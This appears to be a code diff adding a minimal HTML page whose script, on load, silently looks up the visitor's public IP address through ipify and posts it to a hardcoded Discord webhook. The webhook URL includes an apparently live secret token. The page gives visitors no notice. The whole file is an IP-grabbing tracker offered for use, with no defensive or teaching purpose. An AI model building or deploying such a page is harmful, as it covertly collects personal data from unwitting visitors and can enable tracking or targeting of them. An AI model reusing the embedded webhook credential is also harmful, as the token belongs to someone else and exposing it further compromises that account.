@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Get IP and Send to Discord</title>
+</head>
+<body>
+    <script>
+        // Discord Webhook URL
+        const webhookURL = "https://discord.com/api/webhooks/1311146171590508585/hf3DY-DE56mvduSI8q-EstWnr5UOzJAOeVI0pMnNN_YTkT10oFVYu3OGBzJCpg6UsUe7";
+
+        // Get public IP address
+        fetch("https://api.ipify.org?format=json")
+            .then(response => response.json())
+            .then(data => {
+                const ip = data.ip;
+
+                // Send IP to Discord webhook
+                fetch(webhookURL, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        content: `User's IP Address: ${ip}`
+                    })
+                }).then(response => {
+                    if (response.ok) {
+                        console.log("IP sent to Discord successfully.");
+                    } else {
+                        console.error("Failed to send IP to Discord.");
+                    }
+                });
+            })
+            .catch(error => console.error("Error fetching IP:", error));
+    </script>
+</body>
+</html>
